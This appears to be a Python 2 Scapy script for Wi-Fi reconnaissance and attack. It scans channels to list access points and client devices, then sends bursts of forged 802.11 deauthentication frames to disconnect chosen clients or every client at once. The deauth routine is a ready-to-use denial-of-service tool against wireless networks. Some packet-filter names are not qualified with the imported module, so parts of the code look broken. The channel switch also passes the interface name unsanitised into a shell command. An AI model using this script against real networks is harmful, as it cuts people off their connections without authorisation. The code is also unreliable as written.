#!/usr/bin/env python

import os
import argparse
import time

# Suppress Scapy's chattiness
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import scapy.all as sc
sc.conf.verb = 0

sniff_data = {}

def deauth(**kwargs):
    if kwargs.get("broadcast"):
        clients = ["ff:ff:ff:ff:ff:ff"]
    else:
        clients = kwargs.get("clients")
    ap = kwargs.get("ap")

    for i in range(kwargs.get("count")):
        for client in clients:
            deauth_pkt = sc.Dot11(addr1=client, addr2=ap, addr3=ap)/sc.Dot11Deauth()
            ap_deauth_pkt = sc.Dot11(addr1=ap, addr2=client, addr3=ap)/sc.Dot11Deauth()
            for j in range(kwargs.get("burst-size")):
                sc.send(deauth_pkt)
                if not kwargs.get("broadcast"):
                    sc.send(ap_deauth_pkt)
            time.sleep(kwargs.get("sleep-time"))

def sniff_client(p):
    if p.addr2 not in sniff_data.keys():
        sniff_data[p.addr2] = {
            "bssid": p.addr3,
            "essid": p.info if p.info else "<hidden>",
            "client": p.addr2
        }

def discover_clients(**kwargs):
    """
    Only clients should send Dot11ProbeReq, Dot11AssoReq, and Dot11ReassoReq
    """
    packet_filter = lambda p: (p.haslayer(Dot11ProbeReq) 
        or p.haslayer(Dot11AssoReq)
        or p.haslayer(Dot11ReassoReq))

    sc.sniff(iface=kwargs.get("interface"), prn=sniff_client, 
        timeout=None, lfilter=packet_filter)

    print "{: <18} {: <18} {: <25}".format("CLIENT", "BSSID", "ESSID")
    for k, v in sniff_data.items():
        print("{client: <18} {bssid: <18} {essid: <25}".format(**v))

def sniff_ap(p):
    if p[Dot11].addr3 not in sniff_data.keys():
        beacon = "{Dot11Beacon:%Dot11Beacon.cap%}"
        prob_resp = "{Dot11ProbeResp:%Dot11ProbeResp.cap%}"
        capability = p.sprintf(beacon + prob_resp)

        sniff_data[p[Dot11].addr3] = {
            "bssid": p[Dot11].addr3,
            "essid": p[Dot11Elt].info if p[Dot11Elt].info else "<hidden>",
            "channel": int(ord(p[Dot11Elt:3].info)),
            "encrypted": "privacy" in capability
        }

def discover_aps(**kwargs):
    """
    Only APs should send Dot11Beacon or Dot11ProbeResp
    """
    packet_filter = lambda p: (p.haslayer(Dot11Beacon)
        or p.haslayer(Dot11ProbeResp))

    for channel in kwargs.get("channels", []):
        os.system("iw dev %s set channel %d" % (kwargs.get("interface"), 
            channel))
        sc.sniff(iface=kwargs.get("interface"), prn=sniff_ap, 
            timeout=kwargs.get("timeout"), lfilter=packet_filter)

    print "{: <3} {: <2} {: <18} {: <25}".format("CH", "E", "BSSID", "ESSID")
    for k, v in sniff_data.items():
        print("{channel: <3} {encrypted: <2} {bssid: <18} {essid: <25}".format(**v))

def parse_args():
    p = argparse.ArgumentParser(description=
        '''
        AP/client discovery and deauthentication.  

        Make sure the interface specified is in monitor mode.

        It's worth noting that this uses 802.11 management frames as opposed
        to data packets.''', formatter_class=argparse.RawTextHelpFormatter)
    subparsers = p.add_subparsers(dest='command')                                                          

    discover_aps = subparsers.add_parser('discover-aps')                                                                    
    discover_aps.add_argument('-i', '--interface', dest='interface', 
        action='store', default="mon0")
    discover_aps.add_argument('-t', '--timeout', dest='timeout', type=int, 
        action='store', default=2)
    discover_aps.add_argument('-c', '--channels', dest='channels', type=int, 
        nargs="+", action='store', default=range(1,15))

    discover_clients = subparsers.add_parser('discover-clients')                                                                    
    discover_clients.add_argument('-i', '--interface', dest='interface', 
        action='store', default="mon0")
    discover_clients.add_argument('-t', '--timeout', dest='timeout', type=int, 
        action='store', default=2)

    deauth = subparsers.add_parser('deauth')                                                                    
    deauth.add_argument('-a', '--access-point', dest='ap', 
        action='store', required=True, help="format: MAC address")
    deauth.add_argument('-n', '--count', dest='count', type=int,
        action='store', default=10, help="number of bursts to send")
    deauth.add_argument('-u', '--burst-size', dest='burst-size', type=int,
        action='store', default=64, help="number of packets in a burst")
    deauth.add_argument('-s', '--sleep-time', dest='sleep-time', type=float,
        action='store', default=0.5, help="time to sleep between bursts")
    group = deauth.add_mutually_exclusive_group(required=True)
    group.add_argument('-c', '--clients', dest='clients', type=str,
        nargs="+", action='store', help="format: MAC address(es)")
    group.add_argument('-b', '--broadcast', dest='broadcast', 
        action='store_true')

    args = p.parse_args()
    return args

def main():
    args = parse_args()

    dispatch = {
        "discover-aps": discover_aps,
        "discover-clients": discover_clients,
        "deauth": deauth
    }

    dispatch[args.command](**args.__dict__)
    
if __name__ == "__main__":
    main()

